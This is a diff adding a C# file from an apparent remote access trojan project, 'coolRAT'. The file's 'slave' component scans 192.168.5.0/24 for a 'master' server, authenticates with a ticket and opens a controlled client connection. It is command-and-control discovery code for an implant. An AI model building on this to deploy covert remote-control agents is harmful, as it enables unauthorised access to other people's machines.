@@ -1,0 +1,69 @@
+﻿using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Linq;
+using System.Net;
+using System.Net.Sockets;
+using System.Text;
+using System.Threading;
+using System.Threading.Tasks;
+using coolRAT.Libs;
+using coolRAT.Libs.Packets;
+
+namespace coolRAT.Slave
+{
+    public struct MasterServerInfo
+    {
+        public Client LocalClient;
+        public IPEndPoint RemoteServer;
+        public bool IsEmpty;
+
+        public MasterServerInfo(Client localClient, IPEndPoint remoteServer)
+        {
+            LocalClient = localClient;
+            RemoteServer = remoteServer;
+            IsEmpty = false;
+        }
+    }
+    public static class MasterFinder
+    {
+        private static ConnectionSettings Settings;
+
+        public static void RunInit(ConnectionSettings settings)
+        {
+            Settings = settings;
+        }
+        public static MasterServerInfo ConnectToMasterServer()
+        {
+            if (Settings.IsEmpty())
+                throw new ArgumentNullException(nameof(Settings));
+            Console.Write("[MasterFinder] Attempting to find the master server... ");
+            for (int i = 1; i<256; i++)
+            {
+                try
+                {
+                    
+                    TcpConnection conn = new TcpConnection();
+                    conn.ConnectTimeout = 1000;
+                    if(!conn.Connect("192.168.5." + i, Settings.Port)) continue;
+
+                    // Authenticate the connection
+                    AuthenticateConnectionPacket authpacket = new AuthenticateConnectionPacket(Auth.ClientAuthenticationTicket);
+                    conn.SendPacket(authpacket);
+                    ConnectionAuthenticatedPacket response = ConnectionAuthenticatedPacket.Deserialize(conn.ReadPacket());
+                    if (response.ConnectionAuthenticated)
+                    {
+                        Console.WriteLine("Success");
+                        Client client = new Client(response.UniqueClientId, new TcpPipes(conn, null, null));
+                        MasterServerInfo inf = new MasterServerInfo(client, conn.Client.Client.RemoteEndPoint as IPEndPoint);
+                        return inf;
+                    }
+                    
+                }
+                catch(Exception e) { Console.WriteLine(e.Message); }
+            }
+            Console.WriteLine("Fail");
+            return new MasterServerInfo();
+        }
+    }
+}
